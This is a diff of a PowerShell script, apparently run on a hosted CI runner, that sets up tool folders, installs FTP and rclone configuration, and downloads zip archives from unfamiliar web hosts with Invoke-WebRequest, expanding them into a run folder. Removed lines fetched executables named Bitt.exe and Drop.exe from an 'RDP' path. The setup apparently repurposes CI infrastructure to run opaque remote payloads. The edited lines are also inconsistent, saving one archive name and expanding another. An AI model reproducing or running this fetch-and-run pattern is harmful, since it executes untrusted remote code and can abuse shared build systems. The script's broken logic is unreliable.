@@ -6,7 +6,7 @@ New-Item -ItemType "directory" -Force -Path "c:\rclone"
 New-Item -ItemType "directory" -Force -Path "c:\TOOLS2"
 New-Item -ItemType "directory" -Force -Path "C:\TOOLS2\RUN\"
 
-$Url = 'https://goldy.gaia.bysh.me/work/Controller.zip' 
+$Url = 'https://35393-59932.77.prepaid-webspace.de/BOXER/Controller.zip' 
 $ZipFile = 'C:\down\' + $(Split-Path -Path $Url -Leaf) 
 $Destination= 'C:\TOOLS2\' 
  
@@ -23,22 +23,11 @@ Copy-Item "C:\TOOLS2\wcx_ftp.ini" -Destination "C:\Users\runneradmin\AppData\Roa
 Copy-Item -Path "C:\TOOLS2\rclone\*" -Destination "C:\rclone\" -Recurse
 
 
-Invoke-WebRequest -Uri "https://goldy.gaia.bysh.me/work/sale1.zip" -OutFile C:\TOOLS2\sale1.zip
-Expand-Archive -LiteralPath 'C:\TOOLS2\sale1.Zip' -DestinationPath C:\TOOLS2\
+Invoke-WebRequest -Uri "https://35393-59932.77.prepaid-webspace.de/BOXER/boxer.zip" -OutFile C:\TOOLS2\Allahu2_Run.zip
+Expand-Archive -LiteralPath 'C:\TOOLS2\boxer.zip' -DestinationPath C:\TOOLS2\RUN\
 
-Invoke-WebRequest -Uri "https://goldy.gaia.bysh.me/work/Alberto_Run.zip" -OutFile C:\TOOLS2\Alberto_Run.zip
-Expand-Archive -LiteralPath 'C:\TOOLS2\Alberto_Run.zip' -DestinationPath C:\TOOLS2\RUN\
+Invoke-WebRequest -Uri "https://35393-59932.77.prepaid-webspace.de/BOXER/rclone.conf" -OutFile C:\rclone\rclone.conf
 
-Invoke-WebRequest -Uri "https://goldy.gaia.bysh.me/work/Allahu_Run.zip" -OutFile C:\TOOLS2\Allahu_Run.zip
-Expand-Archive -LiteralPath 'C:\TOOLS2\Allahu_Run.zip' -DestinationPath C:\TOOLS2\RUN\
-
-Invoke-WebRequest -Uri "https://goldy.gaia.bysh.me/work/Allahu2_Run.zip" -OutFile C:\TOOLS2\Allahu2_Run.zip
-Expand-Archive -LiteralPath 'C:\TOOLS2\Allahu2_Run.zip' -DestinationPath C:\TOOLS2\RUN\
-
-Invoke-WebRequest -Uri "https://goldy.gaia.bysh.me/work/rc/rclone.conf" -OutFile C:\rclone\rclone.conf
-
-Invoke-WebRequest -Uri "https://goldy.gaia.bysh.me/work/RDP/Bitt.exe" -OutFile C:\TOOLS2\Bitt.exe
-Invoke-WebRequest -Uri "https://goldy.gaia.bysh.me/work/RDP/Drop.exe" -OutFile C:\TOOLS2\Drop.exe
 
 Function Set-ScreenResolution { 
 
